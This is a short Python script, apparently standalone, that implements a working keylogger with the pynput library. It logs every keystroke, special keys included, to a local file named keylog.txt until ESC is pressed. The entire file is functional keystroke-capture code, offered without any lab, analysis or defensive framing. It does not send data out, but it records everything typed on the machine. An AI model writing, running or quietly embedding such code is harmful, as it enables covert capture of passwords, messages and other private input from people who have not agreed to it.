import os
import time
from pynput import keyboard

def on_press(key):
    """Handle key press event"""
    try:
        # Write the pressed key to the log file
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    """Handle key release event"""
    if key == keyboard.Key.esc:
        # Stop the keylogger if the Escape key is pressed
        return False

def main():
    """Main entry point"""
    log_file_path = "keylog.txt"
    
    # Check if the log file exists, if not, create it
    if not os.path.exists(log_file_path):
        with open(log_file_path, "w") as log_file:
            log_file.write(f"Keylogger started at {time.ctime()}\n")
    
    print("Keylogger is running. Press ESC to stop.")
    
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
